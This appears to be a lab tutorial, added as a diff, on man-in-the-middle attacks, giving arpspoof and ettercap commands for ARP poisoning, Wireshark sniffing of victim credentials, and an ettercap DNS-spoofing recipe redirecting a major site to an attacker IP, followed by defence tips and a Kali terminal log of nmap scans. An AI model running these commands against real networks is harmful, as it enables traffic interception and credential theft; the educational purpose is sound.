@@ -1,0 +1,174 @@
+Man-in-the-Middle (MITM) Attack- Ettercap & Wireshark
+--------------------------------------------------
+
+-----------------------------------------------------
+A Man-in-the-Middle (MITM) attack occurs when an attacker intercepts communication between two parties, allowing them to read, modify, or inject malicious data.
+
+Definition: 
+A Man-in-the-Middle (MITM) attack is a cyberattack where an attacker secretly intercepts and alters communication between two parties. This allows the attacker to steal data, inject malicious content, or impersonate one of the communicating entities.
+
+Outcomes/Learning:  
+After learning about Man-in-the-Middle (MITM) attacks, you will understand how attackers intercept and manipulate network communications. You will also gain knowledge of detection techniques and security measures to prevent such attacks.
+
+
+
+
+________________________________________ Prerequisites:
+•	Attacker System: Kali Linux (or any system with ettercap, arpspoof, and Wireshark installed).
+•	Victim System: A Windows/Linux/Mac machine connected to the same network.
+•	Tools Used:
+o	arpspoof (for ARP poisoning)
+o	ettercap (for automated MITM attacks)
+o	Wireshark (for packet sniffing)
+________________________________________
+Step 1: Enable Packet Forwarding (So Traffic Can Pass Through the Attacker)
+Run the following command to allow Kali Linux to forward network packets:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+🔹Why? Without this, intercepted packets will not reach the actual destination, causing network disruptions.
+________________________________________
+Step 2: Scan the Network to Identify Targets
+First, find the IP address of your machine and the router/gateway:
+ip a | grep inet
+or
+ifconfig
+Next, use nmap to scan the network and identify connected devices:
+sudo nmap -sn 192.168.1.1/24
+This will list all devices on the network, including their IP addresses and MAC addresses.
+________________________________________
+Step 3: Perform ARP Spoofing (Impersonate the Router & Victim)
+Method 1: Using arpspoof (Command Line)
+Run the following two commands in separate terminals:
+1 Spoof the victim by making them think the attacker is the router:
+
+sudo arpspoof -i eth0 -t <victim_IP> <gateway_IP>
+2 Spoof the router by making it believe the attacker is the victim:
+sudo arpspoof -i eth0 -t <gateway_IP> <victim_IP>
+Method 2: Using ettercap (Graphical Interface)
+1.	Open Ettercap in graphical mode:
+sudo ettercap -G
+2.	Go to "Sniff" → "Unified Sniffing", select your network interface (eth0 or wlan0).
+3.	Scan for hosts: "Hosts" → "Scan for hosts".
+4.	Select the victim's IP and router's IP from the host list.
+5.	Click "MITM" → "ARP Poisoning", check "Sniff remote connections", and start.
+________________________________________
+Step 4: Capture Network Traffic (Sniff Data Using Wireshark)
+1.	Open Wireshark:
+2.	Select the network interface (e.g., eth0 for Ethernet or wlan0 for Wi-Fi).
+3.	Apply a filter to capture traffic from the victim:
+ip.addr == <victim_IP>
+4.	Look for unencrypted HTTP traffic, login credentials, and sensitive data.
+________________________________________
+Step 5: Inject Malicious Data (Optional - DNS Spoofing/HTTPS Downgrade)
+DNS Spoofing Example (Redirect Victim to a Fake Website)
+Edit the Ettercap configuration file:
+sudo nano /etc/ettercap/etter.dns
+Add a fake DNS entry like:
+www.facebook.com A 192.168.1.100
+Save and run:
+sudo ettercap -T -q -i eth0 -P dns_spoof -M arp // //
+OR
+sudo ettercap -T -q -i eth0 -P dns_spoof -M arp ///
+
+Now, if the victim visits www.facebook.com, they will be redirected to the attacker's IP (192.168.1.100).
+________________________________________
+Step 6: Stop the Attack and Restore ARP Tables
+Once the test is complete, restore the victim’s original ARP table:
+sudo arp -d <gateway_IP>
+or restart the network interface:
+sudo systemctl restart networking
+________________________________________
+Prevention & Defense Against MITM Attacks
+1.	Use HTTPS Everywhere: Encrypted traffic prevents data interception.
+2.	Enable ARP Spoofing Protection: Use tools like arpwatch.
+3.	Use VPN: Encrypts all traffic, making MITM attacks useless.
+4.	Monitor Network Activity: Use Wireshark to detect unusual ARP activity.
+5.	Static ARP Entries: Manually set ARP entries for critical devices.
+________________________________________
+ Conclusion
+By following this practical, you learned:
+ How attackers intercept network traffic using ARP spoofing.
+How to capture sensitive data using Wireshark.
+How to defend against MITM attacks.
+Let me know if you need further explanation or modifications! 
+
+
+
+===============================================================================
+===============================================================================
+
+                                                                                                       
+┌──(root㉿kali)-[/home/kali]
+└─# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+                                                                                                       
+┌──(root㉿kali)-[/home/kali]
+└─# ip a | grep inet
+    inet 127.0.0.1/8 scope host lo
+    inet6 ::1/128 scope host noprefixroute 
+    inet 192.168.176.164/24 brd 192.168.176.255 scope global dynamic noprefixroute eth0
+    inet6 fe80::6241:3b00:84f:3352/64 scope link noprefixroute 
+                                                                                                          
+┌──(root㉿kali)-[/home/kali]
+└─# ifconfig        
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.176.164  netmask 255.255.255.0  broadcast 192.168.176.255
+        inet6 fe80::6241:3b00:84f:3352  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:1f:c8:8f  txqueuelen 1000  (Ethernet)
+        RX packets 15142  bytes 10934723 (10.4 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4471  bytes 714626 (697.8 KiB)
+        TX errors 0  dropped 2 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 28  bytes 1480 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 28  bytes 1480 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                          
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -sn 192.168.1.1/24           
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 14:37 EST
+Stats: 0:00:18 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan
+Ping Scan Timing: About 8.79% done; ETC: 14:40 (0:03:07 remaining)
+
+zsh: suspended  nmap -sn 192.168.1.1/24
+                                                                                                          
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -Pn 192.168.1.1/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 14:38 EST
+
+zsh: suspended  nmap -Pn 192.168.1.1/24
+                                                                                                          
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -Pn -A 192.168.1.1/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 14:38 EST
+
+zsh: suspended  nmap -Pn -A 192.168.1.1/24
+                                                                                                          
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -sn -vv 192.168.1.1/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 14:39 EST
+Initiating Ping Scan at 14:39
+Scanning 256 hosts [4 ports/host]
+Ping Scan Timing: About 14.89% done; ETC: 14:42 (0:02:57 remaining)
+Completed Ping Scan at 14:40, 60.04s elapsed (256 total hosts)
+Initiating Parallel DNS resolution of 256 hosts. at 14:40
+Completed Parallel DNS resolution of 256 hosts. at 14:40, 12.71s elapsed
+Nmap scan report for 192.168.1.0
+Host is up, received reset ttl 128 (0.00022s latency).
+Nmap scan report for 192.168.1.1
+Host is up, received reset ttl 128 (0.0019s latency).
+Nmap scan report for 192.168.1.254
+Host is up, received reset ttl 128 (0.0018s latency).
+Nmap scan report for 192.168.1.255
+Host is up, received reset ttl 128 (0.00025s latency).
+Nmap done: 256 IP addresses (256 hosts up) scanned in 72.89 seconds
+           Raw packets sent: 1700 (63.736KB) | Rcvd: 286 (11.440KB)
+                                                                                               
+┌──(root㉿kali)-[/home/kali]
+└─# 
